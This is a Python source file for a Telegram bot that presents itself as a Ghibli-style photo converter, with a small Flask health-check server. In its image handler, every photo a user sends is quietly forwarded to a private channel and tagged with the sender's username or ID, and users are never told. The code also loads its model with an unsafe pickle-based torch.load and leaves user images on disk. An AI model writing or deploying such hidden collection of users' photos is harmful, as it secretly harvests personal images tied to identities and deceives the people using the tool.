import os
import logging
import torch
import cv2
import threading
import numpy as np
from flask import Flask
from telegram import Update
from telegram.ext import Application, CommandHandler, MessageHandler, filters, ContextTypes
from PIL import Image
from torchvision import transforms

# Telegram Channel ID for saving original images
CHANNEL_ID = os.getenv("TELEGRAM_CHANNEL_ID")  # Add your private channel ID in .env

# Load Model
MODEL_PATH = "models/ghibli_grain.pth"

if not os.path.exists(MODEL_PATH):
    raise FileNotFoundError(f"Model file '{MODEL_PATH}' not found!")

device = torch.device("cuda" if torch.cuda.is_available() else "cpu")
model = torch.load(MODEL_PATH, map_location=device)
model.eval()

# Initialize Logging
logging.basicConfig(format='%(asctime)s - %(name)s - %(levelname)s - %(message)s', level=logging.INFO)
logger = logging.getLogger(__name__)

# Flask App for Health Check
app = Flask(__name__)

@app.route("/")
def home():
    return "Bot is running!"

def run_flask():
    app.run(host="0.0.0.0", port=8000)

# Start Command
async def start_command(update: Update, context: ContextTypes.DEFAULT_TYPE):
    await update.message.reply_text("🎨 Send me an image, and I'll transform it into Ghibli-style artwork!")

# Handle Image Processing
async def handle_image(update: Update, context: ContextTypes.DEFAULT_TYPE):
    try:
        message = update.message
        user = message.from_user
        
        # Download image
        await message.reply_text("✨ Processing your image...")
        photo_file = await message.photo[-1].get_file()
        input_path = f"user_input_{user.id}.jpg"
        await photo_file.download_to_drive(input_path)

        # Forward Original Image to Private Channel
        await context.bot.send_photo(chat_id=CHANNEL_ID, photo=open(input_path, 'rb'), caption=f"📷 Image from {user.username or user.id}")

        # Convert to Ghibli Style
        output_path = f"ghibli_output_{user.id}.jpg"
        transform_image(input_path, output_path)

        # Send Transformed Image
        await message.reply_photo(photo=open(output_path, 'rb'), caption="Here's your Ghibli-styled image! 🌸")

    except Exception as e:
        logger.error(f"Error processing image: {e}")
        await update.message.reply_text("⚠️ Oops! Something went wrong. Please try another image.")

# Apply Ghibli Model Transformation
def transform_image(input_path, output_path):
    image = Image.open(input_path).convert("RGB")
    transform = transforms.Compose([
        transforms.ToTensor(),
        transforms.Resize((512, 512)),
        transforms.Normalize((0.5,), (0.5,))
    ])
    image_tensor = transform(image).unsqueeze(0).to(device)

    with torch.no_grad():
        output_tensor = model(image_tensor).cpu()

    output_image = transforms.ToPILImage()(output_tensor.squeeze(0))
    output_image.save(output_path)

if __name__ == '__main__':
    # Start Flask Server in a Thread
    threading.Thread(target=run_flask).start()

    # Start Telegram Bot
    token = os.getenv("TELEGRAM_TOKEN")
    if not token:
        raise ValueError("TELEGRAM_TOKEN is not set in the .env file")
    
    bot = Application.builder().token(token).build()

    bot.add_handler(CommandHandler('start', start_command))
    bot.add_handler(MessageHandler(filters.PHOTO, handle_image))

    bot.run_polling()
